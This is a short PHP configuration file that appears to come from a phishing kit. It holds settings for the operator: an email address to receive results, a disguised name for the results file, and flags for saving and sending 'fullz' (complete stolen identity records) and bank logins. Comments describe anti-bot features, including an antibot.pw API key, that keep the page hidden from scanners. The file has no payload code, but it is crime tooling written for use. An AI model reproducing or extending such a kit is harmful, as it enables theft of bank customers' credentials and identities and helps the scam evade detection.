<?php
session_start();


$uremail = "";                    // Your Email Address
$resultsName = '';  //This will help to protect your results (rather than txt files generic name and easy to find) & also give some 
                                //personalisation on your results
$saveFullz = '1';
$sendFullz = '1';
$bankLogs = '1';
$encrypt = '0';

//This page uses multiple AntiBot features, including antibot.pw
//To enable AntiBot.pw please go to security folder, and edit the index.php
//In there you will need to enter your api key where specified